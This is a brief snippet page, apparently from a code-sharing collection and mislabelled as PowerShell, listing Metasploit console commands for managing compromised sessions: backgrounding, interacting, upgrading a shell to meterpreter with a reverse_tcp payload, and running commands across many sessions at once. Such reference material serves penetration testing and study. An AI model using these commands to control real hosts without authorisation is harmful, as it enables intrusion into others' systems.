---
id: 1cf928f6-36d5-4dc7-9132-fb5da95b05a5
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.201328+00:00'
updated_at: '2023-04-10T20:24:56.116183+00:00'
---

# Code Snippet 1cf928f6

**Language**: Powershell

```powershell
CTRL+Z   -> Session in Background
sessions -> List all available sessions
sessions -i session_number -> Interact with a specific session
sessions -u session_number -> Upgrade session to a meterpreter
sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-> Upgrade session to a meterpreter with custom options

sessions -c cmd           -> Execute a command on multiple sessions
sessions -i 10-20 -c "id" -> Execute a command on a range of sessions
```


